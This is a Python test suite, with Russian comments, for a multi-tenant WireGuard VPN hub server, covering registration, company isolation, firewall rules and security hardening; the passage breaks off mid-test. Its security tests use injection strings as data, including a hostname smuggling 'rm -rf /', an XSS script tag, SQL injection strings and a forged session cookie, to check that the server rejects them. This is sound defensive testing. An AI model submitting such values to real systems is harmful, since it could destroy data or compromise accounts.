"""Сервер: суперадмин, регистрация, изоляция компаний, кабинет, сеть, безопасность."""
import concurrent.futures
import os
import re

import pytest

from conftest import fake_setup, new_pubkey


# ---------------------------------------------------------------- суперадмин

class TestAdmin:
    def test_login_wrong_and_right(self, ctx):
        c = ctx.TestClient(ctx.app)
        assert "err=1" in c.post("/admin/login", data={"login": "admin", "password": "x"}, follow_redirects=False).headers["location"]
        assert "err=1" in c.post("/admin/login", data={"login": "AVAZ", "password": "supersecret"}, follow_redirects=False).headers["location"]
        assert c.post("/admin/login", data={"login": "admin", "password": "supersecret"}, follow_redirects=False).headers["location"] == "/admin"

    def test_pages_require_login(self, ctx):
        c = ctx.TestClient(ctx.app)
        for url in ("/admin", "/admin/companies/1"):
            r = c.get(url, follow_redirects=False)
            assert r.status_code == 303 and r.headers["location"] == "/admin/login"
        r = c.post("/admin/companies", data={"login": "x1x", "cabinet_password": "123456", "join_password": "123456"},
                   follow_redirects=False)
        assert r.headers["location"] == "/admin/login"

    def test_company_session_is_not_admin(self, ctx):
        ctx.company("firma1")
        cab = ctx.cabinet("firma1")
        assert cab.get("/admin", follow_redirects=False).headers["location"] == "/admin/login"

    def test_create_company_validation(self, ctx):
        ctx.company("firma1")
        for data, err in [
            ({"login": "Firma1"}, "уже есть"),            # логин без учёта регистра
            ({"login": "ab"}, "Логин"),                     # короткий
            ({"login": "фирма"}, "Логин"),                  # не латиница
            ({"login": "a b c"}, "Логин"),
            ({"login": "firma2", "cabinet_password": "123"}, "минимум 6"),
        ]:
            payload = {"login": "x", "cabinet_password": "123456", "join_password": "123456"} | data
            r = ctx.admin.post("/admin/companies", data=payload)
            assert err in r.text, (data, r.text[:300])

    def test_subnets_sequential_and_reused(self, ctx):
        from app import db
        ids = [ctx.company(f"firma{i}") for i in range(1, 4)]
        conn = db.connect()
        assert [r[0] for r in conn.execute("SELECT subnet_index FROM companies ORDER BY id")] == [1, 2, 3]
        ctx.admin.post(f"/admin/companies/{ids[1]}/delete", data={"confirm": "firma2"})
        ctx.company("firma4")
        assert conn.execute("SELECT subnet_index FROM companies WHERE login='firma4'").fetchone()[0] == 2

    def test_delete_requires_confirm_and_cascades(self, ctx, net):
        cid = ctx.company("firma1")
        ctx.register("firma1", "PC1")
        r = ctx.admin.post(f"/admin/companies/{cid}/delete", data={"confirm": "wrong"})
        assert "введите логин" in r.text
        ctx.admin.post(f"/admin/companies/{cid}/delete", data={"confirm": "firma1"})
        from app import db
        assert db.connect().execute("SELECT COUNT(*) FROM devices").fetchone()[0] == 0
        assert net["peers"] == {}

    def test_admin_sees_all_companies(self, ctx):
        ctx.company("firma1", name="Первая")
        ctx.company("firma2", name="Вторая")
        page = ctx.admin.get("/admin").text
        assert "Первая" in page and "Вторая" in page

    def test_admin_reset_passwords(self, ctx):
        cid = ctx.company("firma1")
        ctx.admin.post(f"/admin/companies/{cid}/passwords", data={"cabinet_password": "newcab1", "join_password": "newjoin1"})
        ctx.cabinet("firma1", "newcab1")
        ctx.register("firma1", join="newjoin1")
        ctx.register("firma1", join="join123", expect=401)

    def test_unknown_company_page(self, ctx):
        r = ctx.admin.get("/admin/companies/999")
        assert r.status_code == 200 and "не найдена" in r.text


# ---------------------------------------------------------------- регистрация клиента

class TestRegister:
    def test_wrong_password_and_unknown_company(self, ctx):
        ctx.company("firma1")
        ctx.register("firma1", join="bad", expect=401)
        ctx.register("nofirma", expect=401)

    @pytest.mark.parametrize("key", ["", "abc", "A" * 44, "!" * 43 + "=", new_pubkey()[:-2] + "=="])
    def test_bad_public_key(self, ctx, key):
        ctx.company("firma1")
        r = ctx.api.post("/api/register", json={"company_login": "firma1", "join_password": "join123",
                                                "device_name": "PC", "public_key": key})
        assert r.status_code in (400, 422)

    def test_login_case_insensitive(self, ctx):
        ctx.company("firma1")
        assert ctx.register("FIRMA1")["ip"] == "10.66.1.2"

    def test_config_contents(self, ctx):
        ctx.company("firma1")
        cfg = ctx.register("firma1", "Бухгалтерия", "BUH-01")
        assert cfg["address"] == "10.66.1.2/32"
        assert cfg["allowed_ips"] == "10.66.1.0/24, 10.66.0.1/32"
        assert "0.0.0.0" not in cfg["allowed_ips"]          # интернет мимо VPN
        assert cfg["endpoint"] == "vpn.test.uz:51820"
        assert cfg["status"] == "active" and cfg["share"] is None
        assert len(cfg["server_public_key"]) == 44 and len(cfg["token"]) > 30

    def test_ips_unique_and_reused_after_delete(self, ctx):
        ctx.company("firma1")
        a, b, c = (ctx.register("firma1", f"PC{i}") for i in range(3))
        assert [a["ip"], b["ip"], c["ip"]] == ["10.66.1.2", "10.66.1.3", "10.66.1.4"]
        cab = ctx.cabinet("firma1")
        cab.post(f"/cabinet/devices/{b['device_id']}/delete")
        assert ctx.register("firma1", "PC9")["ip"] == "10.66.1.3"

    def test_reregister_same_key_keeps_ip_and_rotates_token(self, ctx):
        ctx.company("firma1")
        first = ctx.register("firma1", "PC1")
        again = ctx.register("firma1", "PC1-новое", key=first["_key"])
        assert again["ip"] == first["ip"] and again["device_id"] == first["device_id"]
        assert ctx.api.get("/api/me", headers=ctx.h(again["token"])).json()["device_name"] == "PC1-новое"
        # прежний токен после повторного входа — только у копии: ПК отключается до одобрения
        r = ctx.api.get("/api/me", headers=ctx.h(first["token"]))
        assert r.status_code == 401 and "другом компьютере" in r.json()["detail"]
        assert ctx.api.get("/api/me", headers=ctx.h(again["token"])).status_code == 401

    def test_same_key_other_company_conflict(self, ctx):
        ctx.company("firma1"); ctx.company("firma2")
        d = ctx.register("firma1")
        ctx.register("firma2", key=d["_key"], expect=409)

    def test_device_limit(self, ctx):
        ctx.company("firma1", max_devices=2)
        d = ctx.register("firma1"); ctx.register("firma1")
        r = ctx.register("firma1", expect=403)
        assert "лимит" in r.json()["detail"]
        ctx.register("firma1", key=d["_key"])  # повторный вход существующего ПК — не новый слот

    def test_hostname_sanitized_and_name_limits(self, ctx):
        ctx.company("firma1")
        assert ctx.register("firma1", hostname="pc1; rm -rf /")["_key"]
        from app import db
        assert db.connect().execute("SELECT hostname FROM devices").fetchone()[0] == "pc1rm-rf"
        ctx.register("firma1", name="x" * 65, expect=422)
        ctx.register("firma1", name="", expect=422)

    def test_disabled_company(self, ctx):
        cid = ctx.company("firma1")
        d = ctx.register("firma1")
        ctx.admin.post(f"/admin/companies/{cid}/update", data={"name": "x", "max_devices": 5})  # is_active не передан = выкл
        ctx.register("firma1", expect=403)
        assert ctx.api.get("/api/me", headers=ctx.h(d["token"])).status_code == 403

    def test_bad_tokens(self, ctx):
        for headers in ({}, {"Authorization": "Bearer "}, {"Authorization": "Bearer nope"}, {"Authorization": "Basic x"}):
            assert ctx.api.get("/api/me", headers=headers).status_code == 401
            assert ctx.api.get("/api/peers", headers=headers).status_code == 401

    def test_rate_limit(self, ctx):
        ctx.company("firma1")
        for _ in range(10):
            ctx.register("firma1", join="bad", expect=401)
        ctx.register("firma1", expect=429)  # даже с верным паролем — блок на 10 минут

    def test_parallel_registrations_get_unique_ips(self, ctx):
        ctx.company("firma1", max_devices=200)

        def reg(i):
            r = ctx.api.post("/api/register", json={"company_login": "firma1", "join_password": "join123",
                                                    "device_name": f"PC{i}", "public_key": new_pubkey()})
            return r.status_code, r.json().get("ip")
        with concurrent.futures.ThreadPoolExecutor(16) as ex:
            res = list(ex.map(reg, range(60)))
        assert all(code == 200 for code, _ in res), res
        ips = [ip for _, ip in res]
        assert len(set(ips)) == 60

    def test_heartbeat(self, ctx):
        ctx.company("firma1")
        d = ctx.register("firma1")
        assert ctx.api.post("/api/heartbeat", headers=ctx.h(d["token"]), json={"client_version": "1.2.3"}).json()["ok"]
        from app import db
        row = db.connect().execute("SELECT client_version, last_seen FROM devices").fetchone()
        assert row[0] == "1.2.3" and row[1]

    def test_server_version_matches_client(self, ctx):
        """Версия сервера поднимается вместе с клиентом и видна суперадмину."""
        import re
        from app.config import APP_VERSION
        from conftest import ROOT
        client = re.search(r'^VERSION = "([0-9.]+)"', (ROOT / "client" / "retixhub_client.py").read_text("utf-8"), re.M)
        assert client and APP_VERSION == client.group(1)
        assert ctx.api.get("/api").json()["version"] == APP_VERSION
        assert f"сервер {APP_VERSION}" in ctx.admin.get("/admin").text

    def test_ping(self, ctx):
        assert ctx.api.get("/api/ping").json()["ok"] is True


# ---------------------------------------------------------------- изоляция компаний

class TestIsolation:
    def setup_two(self, ctx):
        ctx.company("login1"); ctx.company("login2")
        a1 = ctx.register("login1", "A-PC1", "APC1")
        a2 = ctx.register("login1", "A-PC2", "APC2")
        b1 = ctx.register("login2", "B-PC1", "BPC1")
        return a1, a2, b1

    def test_peers_only_own_company(self, ctx):
        a1, a2, b1 = self.setup_two(ctx)
        names_a = {p["name"] for p in ctx.api.get("/api/peers", headers=ctx.h(a1["token"])).json()["peers"]}
        names_b = {p["name"] for p in ctx.api.get("/api/peers", headers=ctx.h(b1["token"])).json()["peers"]}
        assert names_a == {"A-PC1", "A-PC2"} and names_b == {"B-PC1"}

    def test_subnets_differ(self, ctx):
        a1, _, b1 = self.setup_two(ctx)
        assert a1["ip"].startswith("10.66.1.") and b1["ip"].startswith("10.66.2.")
        assert "10.66.2" not in a1["allowed_ips"]

    def test_cabinet_shows_only_own(self, ctx):
        self.setup_two(ctx)
        page = ctx.cabinet("login1").get("/cabinet").text
        assert "A-PC1" in page and "B-PC1" not in page and "login2" not in page

    @pytest.mark.parametrize("action", ["approve", "block", "unblock", "delete", "share", "unshare", "rename"])
    def test_cabinet_cannot_touch_foreign_device(self, ctx, action):
        _, _, b1 = self.setup_two(ctx)
        cab = ctx.cabinet("login1")
        r = cab.post(f"/cabinet/devices/{b1['device_id']}/{action}", data={"value": "hacked"})
        assert "не найдено" in r.text
        me = ctx.api.get("/api/me", headers=ctx.h(b1["token"])).json()
        assert me["status"] == "active" and me["device_name"] == "B-PC1" and not me["is_share_host"]

    def test_cabinet_wrong_password_and_other_company_password(self, ctx):
        ctx.company("login1", cab="pass111"); ctx.company("login2", cab="pass222")
        c = ctx.TestClient(ctx.app)
        assert "err=1" in c.post("/cabinet/login", data={"login": "login1", "password": "pass222"}, follow_redirects=False).headers["location"]
        # пароль подключения не открывает кабинет
        assert "err=1" in c.post("/cabinet/login", data={"login": "login1", "password": "join123"}, follow_redirects=False).headers["location"]

    def test_forged_session_cookie(self, ctx):
        ctx.company("login1")
        c = ctx.TestClient(ctx.app)
        c.cookies.set("retix_session", "eyJyb2xlIjogImFkbWluIn0=.fake.sig")
        assert c.get("/admin", follow_redirects=False).headers["location"] == "/admin/login"
        assert c.get("/cabinet", follow_redirects=False).headers["location"] == "/cabinet/login"

    def test_session_dies_when_company_disabled_or_deleted(self, ctx):
        cid = ctx.company("login1")
        cab = ctx.cabinet("login1")
        ctx.admin.post(f"/admin/companies/{cid}/update", data={"name": "x", "max_devices": 5})
        assert cab.get("/cabinet", follow_redirects=False).headers["location"] == "/cabinet/login"
        assert "отключена" in ctx.TestClient(ctx.app).post(
            "/cabinet/login", data={"login": "login1", "password": "cab123"}).text

    def test_messages_within_company(self, ctx):
        a1, a2, b1 = self.setup_two(ctx)
        h1, h2, hb = ctx.h(a1["token"]), ctx.h(a2["token"]), ctx.h(b1["token"])
        assert ctx.api.post("/api/messages", headers=h1, json={"to": a2["device_id"], "text": " Привет "}).status_code == 200
        msgs = ctx.api.get("/api/messages", headers=h2).json()["messages"]
        assert [(m["from_name"], m["from_ip"], m["text"]) for m in msgs] == [("A-PC1", a1["ip"], "Привет")]
        assert ctx.api.get("/api/messages", headers=h2).json()["messages"] == []   # отдаётся один раз
        # в чужую компанию нельзя — и не видно, что такой ПК есть
        assert ctx.api.post("/api/messages", headers=hb, json={"to": a1["device_id"], "text": "x"}).status_code == 404
        assert ctx.api.post("/api/messages", headers=h1, json={"to": b1["device_id"], "text": "x"}).status_code == 404
        assert ctx.api.get("/api/messages", headers=hb).json()["messages"] == []
        assert ctx.api.post("/api/messages", headers=h1, json={"to": a2["device_id"], "text": "   "}).status_code == 400
        assert ctx.api.post("/api/messages", headers=h1, json={"to": a2["device_id"], "text": "x" * 2001}).status_code == 422
        assert ctx.api.post("/api/messages", json={"to": a2["device_id"], "text": "x"}).status_code == 401

    def test_messages_rate_limit(self, ctx):
        a1, a2, _ = self.setup_two(ctx)
        h1 = ctx.h(a1["token"])
        codes = [ctx.api.post("/api/messages", headers=h1, json={"to": a2["device_id"], "text": str(i)}).status_code
                 for i in range(32)]
        assert codes.count(200) == 30 and codes[-1] == 429

    def test_blocked_device_cannot_message(self, ctx):
        a1, a2, _ = self.setup_two(ctx)
        ctx.cabinet("login1").post(f"/cabinet/devices/{a1['device_id']}/block")
        r = ctx.api.post("/api/messages", headers=ctx.h(a1["token"]), json={"to": a2["device_id"], "text": "x"})
        assert r.status_code == 403
        r = ctx.api.post("/api/messages", headers=ctx.h(a2["token"]), json={"to": a1["device_id"], "text": "x"})
        assert r.status_code == 404

    def test_firewall_rules_per_company(self, ctx, net):
        a1, a2, b1 = self.setup_two(ctx)
        rules = net["rules"]
        # общие папки (SMB) — между всеми ПК компании, без отметки «ПК с папкой»
        assert "-A RETIX_FWD -s 10.66.1.0/24 -d 10.66.1.0/24 -p tcp -m multiport --dports 445 -j ACCEPT" in rules
        assert "-A RETIX_FWD -s 10.66.2.0/24 -d 10.66.2.0/24 -p tcp -m multiport --dports 445 -j ACCEPT" in rules
        # Radmin Viewer -> Radmin Server (4899) — внутри компании
        assert "-A RETIX_FWD -s 10.66.1.0/24 -d 10.66.1.0/24 -p tcp --dport 4899 -j ACCEPT" in rules
        assert "-A RETIX_FWD -s 10.66.1.0/24 -d 10.66.1.0/24 -p icmp -j ACCEPT" in rules
        assert "-A RETIX_FWD -s 10.66.2.0/24 -d 10.66.2.0/24 -p icmp -j ACCEPT" in rules
        # ни одного правила, разрешающего трафик между подсетями
        for r in rules:
            m = re.search(r"-s (\S+) -d (\S+)", r)
            assert m.group(1).split(".")[2] == m.group(2).split(".")[2], r

    def test_disabled_company_removed_from_network(self, ctx, net):
        a1, a2, b1 = self.setup_two(ctx)
        assert b1["_key"] in net["peers"]
        cid = ctx.admin.get("/admin").text  # noqa: F841
        from app import db
        cid2 = db.connect().execute("SELECT id FROM companies WHERE login='login2'").fetchone()[0]
        ctx.admin.post(f"/admin/companies/{cid2}/update", data={"name": "x", "max_devices": 5})
        assert b1["_key"] not in net["peers"] and a1["_key"] in net["peers"]
        assert not any("10.66.2." in r for r in net["rules"])


# ---------------------------------------------------------------- кабинет: действия с ПК

class TestCabinet:
    def test_block_unblock(self, ctx, net):
        ctx.company("firma1")
        d = ctx.register("firma1")
        cab = ctx.cabinet("firma1")
        cab.post(f"/cabinet/devices/{d['device_id']}/block")
        assert d["_key"] not in net["peers"]
        assert ctx.api.get("/api/me", headers=ctx.h(d["token"])).json()["status"] == "blocked"
        assert ctx.api.get("/api/peers", headers=ctx.h(d["token"])).status_code == 403
        # повторная регистрация заблокированного ключа не снимает блок
        assert ctx.register("firma1", key=d["_key"])["status"] == "blocked"
        cab.post(f"/cabinet/devices/{d['device_id']}/unblock")
        assert d["_key"] in net["peers"]

    def test_approval_flow(self, ctx, net):
        ctx.company("firma1")
        cab = ctx.cabinet("firma1")
        cab.post("/cabinet/settings", data={"require_approval": "1", "share_name": "share", "share_ports": "445"})
        d = ctx.register("firma1")
        assert d["status"] == "pending" and d["_key"] not in net["peers"]
        assert "ждёт одобрения" in cab.get("/cabinet").text
        assert ctx.api.get("/api/peers", headers=ctx.h(d["token"])).status_code == 403
        cab.post(f"/cabinet/devices/{d['device_id']}/approve")
        assert ctx.api.get("/api/me", headers=ctx.h(d["token"])).json()["status"] == "active"
        assert d["_key"] in net["peers"]

    def test_delete_device(self, ctx, net):
        ctx.company("firma1")
        d = ctx.register("firma1")
        ctx.cabinet("firma1").post(f"/cabinet/devices/{d['device_id']}/delete")
        assert ctx.api.get("/api/me", headers=ctx.h(d["token"])).status_code == 401
        assert d["_key"] not in net["peers"]

    def test_share_is_exclusive(self, ctx):
        ctx.company("firma1")
        a = ctx.register("firma1", "A", "PCA"); b = ctx.register("firma1", "B", "PCB")
        cab = ctx.cabinet("firma1")
        cab.post(f"/cabinet/devices/{a['device_id']}/share")
        cab.post(f"/cabinet/devices/{b['device_id']}/share")
        me = ctx.api.get("/api/me", headers=ctx.h(a["token"])).json()
        assert me["share"]["ip"] == b["ip"] and not me["is_share_host"]
        cab.post(f"/cabinet/devices/{b['device_id']}/unshare")
        assert ctx.api.get("/api/me", headers=ctx.h(a["token"])).json()["share"] is None

    def test_blocked_share_host_hidden(self, ctx):
        ctx.company("firma1")
        a = ctx.register("firma1", "A"); b = ctx.register("firma1", "B")
        cab = ctx.cabinet("firma1")
        cab.post(f"/cabinet/devices/{a['device_id']}/share")
        cab.post(f"/cabinet/devices/{a['device_id']}/block")
        assert ctx.api.get("/api/me", headers=ctx.h(b["token"])).json()["share"] is None

    def test_rename(self, ctx):
        ctx.company("firma1")
        d = ctx.register("firma1", "старое")
        cab = ctx.cabinet("firma1")
        assert "Пустое имя" in cab.post(f"/cabinet/devices/{d['device_id']}/rename", data={"value": "  "}).text
        cab.post(f"/cabinet/devices/{d['device_id']}/rename", data={"value": "Новое имя"})
        assert ctx.api.get("/api/me", headers=ctx.h(d["token"])).json()["device_name"] == "Новое имя"

    def test_rename_from_client(self, ctx):
        ctx.company("firma1")
        d = ctx.register("firma1", "старое"); other = ctx.register("firma1", "сосед")
        h = ctx.h(d["token"])
        assert ctx.api.post("/api/rename", headers=h, json={"name": "  \t "}).status_code == 400
        assert ctx.api.post("/api/rename", headers=h, json={"name": "x" * 65}).status_code == 422
        r = ctx.api.post("/api/rename", headers=h, json={"name": " Склад\n  №2 "})
        assert r.status_code == 200 and r.json()["device_name"] == "Склад №2"
        assert ctx.api.get("/api/me", headers=h).json()["device_name"] == "Склад №2"
        names = {p["name"] for p in ctx.api.get("/api/peers", headers=ctx.h(other["token"])).json()["peers"]}
        assert names == {"Склад №2", "сосед"}
        from app import db
        assert db.connect().execute("SELECT COUNT(*) FROM audit_log WHERE action='device_rename_self'").fetchone()[0] == 1
        assert ctx.api.post("/api/rename", json={"name": "чужой"}).status_code == 401

    def test_rename_from_client_blocked(self, ctx):
        ctx.company("firma1")
        d = ctx.register("firma1", "старое")
        ctx.cabinet("firma1").post(f"/cabinet/devices/{d['device_id']}/block")
        assert ctx.api.post("/api/rename", headers=ctx.h(d["token"]), json={"name": "новое"}).status_code == 403

    def test_unknown_action(self, ctx):
        ctx.company("firma1")
        d = ctx.register("firma1")
        assert "Неизвестное действие" in ctx.cabinet("firma1").post(f"/cabinet/devices/{d['device_id']}/explode").text

    @pytest.mark.parametrize("ports,ok", [("445", True), ("445,139", True), ("445, 3389", True),
                                          ("", True), ("0", False), ("70000", False), ("445;rm", False), ("a", False)])
    def test_settings_ports(self, ctx, ports, ok):
        # пустое поле = значение по умолчанию 445
        ctx.company("firma1")
        r = ctx.cabinet("firma1").post("/cabinet/settings", data={"share_name": "share", "share_ports": ports})
        assert ("Настройки сохранены" in r.text) == ok

    @pytest.mark.parametrize("name,ok", [("share", True), ("Общая папка", True), ("a/b", False), ("a\\b", False),
                                         ("x" * 81, False), ("a:b", False)])
    def test_settings_share_name(self, ctx, name, ok):
        ctx.company("firma1")
        r = ctx.cabinet("firma1").post("/cabinet/settings", data={"share_name": name, "share_ports": "445"})
        assert ("Настройки сохранены" in r.text) == ok

    def test_full_lan_rule(self, ctx, net):
        ctx.company("firma1")
        ctx.cabinet("firma1").post("/cabinet/settings", data={"full_lan": "1", "share_name": "share", "share_ports": "445"})
        assert "-A RETIX_FWD -s 10.66.1.0/24 -d 10.66.1.0/24 -j ACCEPT" in net["rules"]

    def test_join_password_change_and_kick_all(self, ctx):
        ctx.company("firma1")
        d = ctx.register("firma1")
        cab = ctx.cabinet("firma1")
        assert "минимум 6" in cab.post("/cabinet/join-password", data={"new_password": "123"}).text
        cab.post("/cabinet/join-password", data={"new_password": "newjoin1"})
        assert ctx.api.get("/api/me", headers=ctx.h(d["token"])).status_code == 200  # без kick_all — работают
        cab.post("/cabinet/join-password", data={"new_password": "newjoin2", "kick_all": "1"})
        assert ctx.api.get("/api/me", headers=ctx.h(d["token"])).status_code == 401
        ctx.register("firma1", join="newjoin1", key=d["_key"], expect=401)
        again = ctx.register("firma1", join="newjoin2", key=d["_key"])
        assert again["ip"] == d["ip"]

    def test_cabinet_password_change(self, ctx):
        ctx.company("firma1")
        cab = ctx.cabinet("firma1")
        assert "неверный" in cab.post("/cabinet/cabinet-password", data={"old_password": "x", "new_password": "123456"}).text
        cab.post("/cabinet/cabinet-password", data={"old_password": "cab123", "new_password": "newcab1"})
        ctx.cabinet("firma1", "newcab1")

    def test_logout(self, ctx):
        ctx.company("firma1")
        cab = ctx.cabinet("firma1")
        cab.post("/cabinet/logout")
        assert cab.get("/cabinet", follow_redirects=False).status_code == 303

    def test_audit_log(self, ctx):
        cid = ctx.company("firma1")
        d = ctx.register("firma1", "PC1")
        ctx.cabinet("firma1").post(f"/cabinet/devices/{d['device_id']}/block")
        page = ctx.admin.get(f"/admin/companies/{cid}").text
        assert "device_register" in page and "device_block" in page


# ---------------------------------------------------------------- безопасность

class TestSecurity:
    def test_xss_escaped(self, ctx):
        ctx.company("firma1")
        ctx.register("firma1", name="<script>alert(1)</script>")
        page = ctx.cabinet("firma1").get("/cabinet").text
        assert "<script>alert(1)</script>" not in page and "&lt;script&gt;" in page

    def test_sql_injection_attempts(self, ctx):
        ctx.company("firma1")
        ctx.register("firma1' OR '1'='1", expect=401)
        c = ctx.TestClient(ctx.app)
        r = c.post("/cabinet/login", data={"login": "firma1' --", "password": "x' OR '1'='1"}, follow_redirects=False)
        assert "err=1" in r.headers["location"]

    def test_passwords_hashed_tokens_hashed(self, ctx):
        ctx.company("firma1")
        d = ctx.register("firma1")
        from app import db
        conn = db.connect()
        c = conn.execute("SELECT * FROM companies").fetchone()
        assert c["join_pass_hash"].startswith("$2") and "join123" not in c["join_pass_hash"]
        assert conn.execute("SELECT token_hash FROM devices").fetchone()[0] != d["token"]

    def test_docs_disabled(self, ctx):
        for url in ("/docs", "/redoc", "/openapi.json"):
            assert ctx.api.get(url).status_code == 404

    def test_client_ip_behind_nginx(self):
        from app.auth import client_ip

        class R:
            def __init__(self, host, headers):
                self.client = type("C", (), {"host": host})()
                self.headers = headers
        assert client_ip(R("127.0.0.1", {"x-real-ip": "1.2.3.4"})) == "1.2.3.4"
        assert client_ip(R("127.0.0.1", {"x-forwarded-for": "5.6.7.8, 10.0.0.1"})) == "5.6.7.8"
        assert client_ip(R("9.9.9.9", {"x-real-ip": "1.2.3.4"})) == "9.9.9.9"  # подделка заголовка извне


# ---------------------------------------------------------------- wg / мониторинг

class TestWg:
    def test_dump_parsing(self, monkeypatch):
        from app import wg
        out = ("PRIVKEY\tPUBKEY\t51820\toff\n"
               "peerA=\t(none)\t1.2.3.4:5555\t10.66.1.2/32\t1731750000\t100\t200\t25\n"
               "peerB=\t(none)\t(none)\t10.66.1.3/32\t0\t0\t0\toff\n")
        monkeypatch.setattr(wg, "run", lambda *a, **k: out)
        peers = wg.dump()
        assert peers[0] == {"public_key": "peerA=", "endpoint": "1.2.3.4:5555", "latest_handshake": 1731750000, "rx": 100, "tx": 200}
        assert peers[1]["endpoint"] == "" and peers[1]["latest_handshake"] == 0

    def test_sync_peers_removes_stale(self, monkeypatch):
        from app import wg
        calls = []
        monkeypatch.setattr(wg, "current_peers", lambda: {"old=", "keep="})
        monkeypatch.setattr(wg, "run", lambda args, **k: calls.append(" ".join(args)) or "")
        wg.sync_peers({"keep=": "10.66.1.2", "new=": "10.66.1.3"})
        assert "wg set wg0 peer old= remove" in calls
        assert "wg set wg0 peer new= allowed-ips 10.66.1.3/32" in calls

    def test_firewall_script(self, monkeypatch):
        from app import wg
        calls = []
        monkeypatch.setattr(wg, "DRY_RUN", False)
        monkeypatch.setattr(wg, "ok", lambda args: False)
        monkeypatch.setattr(wg, "run", lambda args, input=None, **k: calls.append((" ".join(args), input)) or "")
        wg.apply_firewall(["-A RETIX_FWD -s 10.66.1.0/24 -d 10.66.1.0/24 -p icmp -j ACCEPT"])
        script = calls[0][1]
        assert calls[0][0] == "iptables-restore -w --noflush"
        assert script.index("RETIX_FWD -j DROP") > script.index("icmp -j ACCEPT")
        assert ("iptables -w -I FORWARD 1 -i wg0 -j RETIX_FWD", None) in calls
        assert ("iptables -w -I INPUT 1 -i wg0 -j RETIX_IN", None) in calls

    def test_online_from_handshake(self, ctx):
        import time
        from app import db, monitor
        ctx.company("firma1")
        a = ctx.register("firma1", "A"); b = ctx.register("firma1", "B")
        conn = db.connect()
        monitor.update_handshakes(conn, [
            {"public_key": a["_key"], "endpoint": "1.1.1.1:1", "latest_handshake": int(time.time()) - 5, "rx": 100},
            {"public_key": b["_key"], "endpoint": "", "latest_handshake": int(time.time()) - 600, "rx": 100}])
        peers = {p["name"]: p["online"] for p in ctx.api.get("/api/peers", headers=ctx.h(a["token"])).json()["peers"]}
        assert peers == {"A": True, "B": False}

    def test_offline_when_traffic_stops(self, ctx):
        """ПК выключили: handshake ещё «свежий» (до 3 минут), но keepalive больше не приходят —
        через OFFLINE_AFTER_SECONDS он уже offline, не дожидаясь устаревания handshake."""
        import time
        from app import db, monitor, services
        from app.config import OFFLINE_AFTER_SECONDS
        ctx.company("firma1")
        a = ctx.register("firma1", "A"); b = ctx.register("firma1", "B")
        conn = db.connect()
        t0 = int(time.time()) - OFFLINE_AFTER_SECONDS - 30
        hs = int(time.time()) - 60   # handshake минуту назад — по нему ПК ещё был бы «в сети»
        peer = lambda d, rx: {"public_key": d["_key"], "endpoint": "1.1.1.1:1", "latest_handshake": hs, "rx": rx}
        monitor.update_handshakes(conn, [peer(a, 1000), peer(b, 1000)], now=t0)
        # дальше A шлёт keepalive (rx растёт), B выключен (rx не меняется)
        monitor.update_handshakes(conn, [peer(a, 1148), peer(b, 1000)])
        peers = {p["name"]: p["online"] for p in ctx.api.get("/api/peers", headers=ctx.h(a["token"])).json()["peers"]}
        assert peers == {"A": True, "B": False}
        # без трафика вообще (rx=0) — тоже не в сети
        monitor.update_handshakes(conn, [peer(b, 0)])
        assert not services.is_online(conn.execute("SELECT * FROM devices WHERE public_key=?", (b["_key"],)).fetchone())

    def test_server_key_stable(self):
        from app import wg
        k1 = wg.server_public_key()
        wg._server_pub = None
        assert wg.server_public_key() == k1


# ---------------------------------------------------------------- все страницы открываются

def test_all_pages_render(ctx):
    cid = ctx.company("firma1")
    ctx.register("firma1", "PC1")
    for url in ("/admin", f"/admin/companies/{cid}", "/admin/login", "/cabinet/login"):
        assert ctx.admin.get(url).status_code == 200, url
    cab = ctx.cabinet("firma1")
    assert cab.get("/cabinet").status_code == 200



# ---------------------------------------------------------------- публичная часть hub.retix.uz

class TestPublic:
    def test_landing(self, ctx):
        r = ctx.TestClient(ctx.app).get("/")
        assert r.status_code == 200
        for text in ("Retix Hub", "Как это работает", "Возможности", "Скачать", "/cabinet", "hub.retix.uz/api"):
            assert text in r.text, text
        assert "/admin" not in r.text                         # вход суперадмина не светим

    def test_landing_no_private_data(self, ctx):
        ctx.company("secretfirma", name="Секретная фирма")
        ctx.register("secretfirma", "Тайный ПК")
        page = ctx.TestClient(ctx.app).get("/").text
        assert "secretfirma" not in page and "Тайный ПК" not in page and "Секретная" not in page

    def test_api_info(self, ctx):
        info = ctx.api.get("/api").json()
        assert info["name"] == "Retix Hub" and info["base_url"] == "https://hub.retix.uz/api"
        assert "POST /api/register" in info["endpoints"]

    def test_download_missing_and_present(self, ctx):
        import os
        from app.config import DOWNLOADS_DIR
        c = ctx.TestClient(ctx.app)
        path = os.path.join(DOWNLOADS_DIR, "RetixHub.exe")
        if os.path.exists(path):
            os.remove(path)
        r = c.get("/download/client", follow_redirects=False)
        assert r.status_code == 303 and "err=1" in r.headers["location"]
        assert "Скоро здесь появится" in c.get("/").text
        os.makedirs(DOWNLOADS_DIR, exist_ok=True)
        with open(path, "wb") as f:
            f.write(b"MZ-test-exe")
        try:
            r = c.get("/download/client")
            assert r.status_code == 200 and r.content == b"MZ-test-exe"
            assert "RetixHub.exe" in r.headers["content-disposition"]
            assert "Скачать RetixHub.exe" in c.get("/").text
        finally:
            os.remove(path)

    def test_download_newest_setup(self, ctx):
        import os
        from app.config import DOWNLOADS_DIR
        c = ctx.TestClient(ctx.app)
        os.makedirs(DOWNLOADS_DIR, exist_ok=True)
        files = {"RetixHub.exe": b"MZ-old", "RetixHub_Setup_1.0.0.exe": b"MZ-100",
                 "RetixHub_Setup_1.0.10.exe": b"MZ-1010", "RetixHub_Setup_1.0.9.exe": b"MZ-109"}
        for name, data in files.items():
            with open(os.path.join(DOWNLOADS_DIR, name), "wb") as f:
                f.write(data)
        try:
            r = c.get("/download/client")
            assert r.status_code == 200 and r.content == b"MZ-1010"   # 1.0.10 новее 1.0.9
            assert "RetixHub_Setup_1.0.10.exe" in r.headers["content-disposition"]
            assert "Скачать RetixHub_Setup_1.0.10.exe" in c.get("/").text
        finally:
            for name in files:
                os.remove(os.path.join(DOWNLOADS_DIR, name))

    def test_download_wireguard_redirect(self, ctx):
        r = ctx.TestClient(ctx.app).get("/download/wireguard", follow_redirects=False)
        assert r.status_code == 302 and "download.wireguard.com" in r.headers["location"]

    def test_cabinet_header_links_home(self, ctx):
        ctx.company("firma1")
        assert 'href="/"><b>Retix Hub</b>' in ctx.cabinet("firma1").get("/cabinet").text


# ---------------------------------------------------------------- 1.0.5: исправления аудита безопасности

class TestHardening:
    def test_device_name_cannot_inject_js(self, ctx):
        # имя ПК раньше попадало в onsubmit="confirm('…')": &#39; браузер раскодирует — код исполнялся
        cid = ctx.company("firma1")
